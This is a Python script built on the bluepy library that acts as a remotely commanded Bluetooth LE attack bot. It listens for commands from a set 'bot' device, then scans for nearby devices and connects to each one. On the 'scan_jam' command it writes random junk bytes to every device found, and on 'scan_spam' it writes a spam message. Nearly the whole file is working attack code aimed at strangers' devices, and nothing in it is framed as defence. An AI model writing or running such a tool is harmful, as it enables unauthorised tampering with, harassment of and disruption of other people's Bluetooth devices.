from bluepy.btle import Peripheral, DefaultDelegate, Scanner, BTLEException, ADDR_TYPE_RANDOM
import os
import time
import random
from datetime import datetime

# === SET YOUR TARGET MAC ADDRESS HERE ===
TARGET_MAC = "AA:BB:CC:DD:EE:FF"  # Replace with your bot's MAC address

class MeshCommandDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        message = data.decode("utf-8", errors="ignore").strip()
        print(f"📨 Received mesh command: {message}")

        if message == "scan":
            perform_scan()

        elif message == "scan_jam":
            perform_scan_and_attack(mode="jam")

        elif message == "scan_spam":
            perform_scan_and_attack(mode="spam")

def perform_scan():
    print("🔍 Scanning for new devices...")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        for dev in devices:
            mac = dev.addr
            name = dev.getValueText(9) or "Unnamed"
            rssi = dev.rssi
            print(f"✨ Found: {mac} ({name}, RSSI={rssi})")
    except Exception as e:
        print(f"⚠️ Scan failed: {e}")

def perform_scan_and_attack(mode="spam"):
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        for dev in devices:
            target = dev.addr
            try:
                p = Peripheral(target, ADDR_TYPE_RANDOM)
                if mode == "spam":
                    msg = b"SpamJam Love"
                    p.writeCharacteristic(0x0001, msg)
                    print(f"💌 Spammed {target}")
                elif mode == "jam":
                    junk = os.urandom(random.randint(20, 40))
                    p.writeCharacteristic(0x000b, junk, withResponse=False)
                    print(f"🚫 Jammed {target}")
                p.disconnect()
            except Exception as e:
                print(f"⚠️ Could not {mode} {target}: {e}")
    except Exception as e:
        print(f"⚠️ Scan + {mode} failed: {e}")

def listen_to_bot(mac):
    try:
        print(f"📡 Listening for mesh commands from {mac}...")
        p = Peripheral(mac, ADDR_TYPE_RANDOM)
        p.setDelegate(MeshCommandDelegate())
        while True:
            if p.waitForNotifications(10.0):
                continue
    except Exception as e:
        print(f"⚠️ Failed to connect to {mac}: {e}")

if __name__ == "__main__":
    listen_to_bot(TARGET_MAC)
